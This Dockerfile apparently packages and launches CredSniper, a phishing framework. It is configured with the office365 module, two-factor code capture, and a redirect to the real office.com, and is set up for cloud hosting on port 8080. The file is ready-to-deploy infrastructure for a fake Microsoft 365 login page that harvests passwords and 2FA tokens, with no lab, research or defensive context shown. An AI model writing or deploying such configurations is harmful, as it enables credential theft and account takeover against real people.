# syntax=docker/dockerfile:1
FROM python:3.11-slim

# Install system dependencies
RUN apt-get update && \
    apt-get install -y --no-install-recommends \
        chromium chromium-driver \
        libglib2.0-0 libnss3 libgdk-pixbuf2.0-0 libx11-xcb1 libxcomposite1 libxcursor1 \
        libxdamage1 libxrandr2 libgbm1 libpangocairo-1.0-0 libpango-1.0-0 libatk-bridge2.0-0 \
        libgtk-3-0 libdrm2 libxss1 libasound2 libxshmfence1 fonts-liberation ca-certificates \
        && rm -rf /var/lib/apt/lists/*

ENV CHROME_BIN=/usr/bin/chromium
ENV CHROMEDRIVER_PATH=/usr/bin/chromedriver

# Set workdir
WORKDIR /app
COPY CredSniper /app/CredSniper
COPY CredSniper/requirements.txt /app/requirements.txt

RUN pip install --no-cache-dir -r /app/requirements.txt

# Expose port (Koyeb will map automatically)
EXPOSE 8080

# Default command – run CredSniper with env vars
CMD ["python", "-u", "CredSniper/credsniper.py", "--module", "office365", "--twofactor", "--final", "https://www.office.com", "--hostname", "example.com", "--port", "8080"] 